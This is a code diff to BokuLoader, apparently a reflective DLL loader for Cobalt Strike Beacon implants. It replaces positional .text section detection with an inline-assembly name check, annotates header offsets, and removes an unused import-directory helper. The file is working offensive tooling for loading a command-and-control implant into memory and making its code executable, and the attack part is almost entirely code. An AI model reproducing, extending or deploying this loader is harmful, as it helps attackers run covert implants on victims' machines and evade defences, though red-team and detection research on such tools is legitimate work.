@@ -18,7 +18,6 @@ void* getOptionalHeader(void* NewExeHeader);
 void* getSizeOfOptionalHeader(void* NewExeHeader);
 void* add(void* , void* );
 void* getNumberOfSections(void* newExeHeaderAddr);
-void* getImportDirectory(void* OptionalHeader);
 void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr);
 
 typedef struct Export {
@@ -126,14 +125,14 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     #endif
 
     // Save .text section address and size for destination RDLL so we can make it RE later
-    BOOL textSectionFlag = TRUE;
+    BOOL textSectionFlag = FALSE;
     __int64 numberOfSections      = (__int64)rdll_src.NumberOfSections;
     rdll_src.NthSection           = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
     Section section;
     while( numberOfSections-- )
     {
         __asm__(
-            "add rax, 0xC \n"
+            "add rax, 0xC \n" // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
             "xor rbx, rbx \n"
             "mov ebx, [rax] \n"
             "xchg rax, rbx \n"
@@ -142,7 +141,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         );
         section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
         __asm__(
-            "add rax, 0x14 \n"
+            "add rax, 0x14 \n" // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
             "xor rbx, rbx \n"
             "mov ebx, [rax] \n"
             "xchg rax, rbx \n"
@@ -151,19 +150,33 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         );
         section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
         __asm__(
-            "add rax, 0x10 \n"
+            "add rax, 0x10 \n" // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
             "xor rbx, rbx \n"
             "mov ebx, [rax] \n"
             "xchg rax, rbx \n"
-            :[SizeOfSection] "=r" (section.SizeOfSection)
-            :[nthSection] "r" (rdll_src.NthSection)
+            :[SizeOfSection] "=r" (section.SizeOfSection) // RAX OUT
+            :[nthSection] "r" (rdll_src.NthSection) // RAX IN
         );
-        // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
-        if(textSectionFlag == TRUE)
+        // check if this is the .text section
+        if (textSectionFlag == FALSE)
         {
-            textSectionFlag = FALSE; 
-            rdll_dst.TextSection = section.dst_rdll_VA;
-            rdll_dst.TextSectionSize = section.SizeOfSection;
+            __asm__(
+                "mov rbx, [rax] \n" // name of the section
+                "xor rax, rax \n"
+                "mov rdx, 0x747865742e \n" // 0x747865742e == '.text'
+                "cmp rbx, rdx \n"
+                "jne nottext \n"
+                "mov rax, 0x1 \n"
+                "nottext: \n"
+                :[textSectionFlag] "=r" (textSectionFlag) // RAX OUT
+                :[nthSection] "r" (rdll_src.NthSection) // RAX IN
+            );
+            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
+            if(textSectionFlag == TRUE)
+            {
+                rdll_dst.TextSection = section.dst_rdll_VA;
+                rdll_dst.TextSectionSize = section.SizeOfSection;
+            }
         }
         // Copy the section from the source address to the destination for the size of the section
         copyMemory(section.SizeOfSection, section.src_rdll_VA, section.dst_rdll_VA);
@@ -179,7 +192,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         "mov ebx, [rax] \n"  // RVA of Import Directory
         "add rdx, rbx \n"    // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
         "xchg rax, rdx \n"
-        :[ImportDirectory] "=r" (ImportDirectory)
+        :[ImportDirectory] "=r" (ImportDirectory) // RAX OUT
         :[DataDirectory] "r" (DataDirectory), // RAX IN 
          [dllBase] "r" (rdll_dst.dllBase)     // RDX IN
     );
@@ -219,7 +232,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         );
         __asm__(
             "xor rbx, rbx \n"        // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
-            "add rax, 0x10 \n"       // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descripto
+            "add rax, 0x10 \n"       // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
             "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
             "add rbx, rdx \n"        // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
             "xchg rax, rbx \n"
@@ -617,10 +630,6 @@ __asm__(
     "xor rax, rax \n"
     "mov ax, [rcx] \n"
     "ret \n" 
-"getImportDirectory: \n"
-    "add rcx, 0x78 \n"
-    "xchg rax, rcx \n"
-    "ret \n" //return ImportDirectory 
 "getBeaconEntryPoint: \n"
     "add rdx, 0x10 \n"          // OptionalHeader.AddressOfEntryPoint
     "mov eax, [rdx] \n"
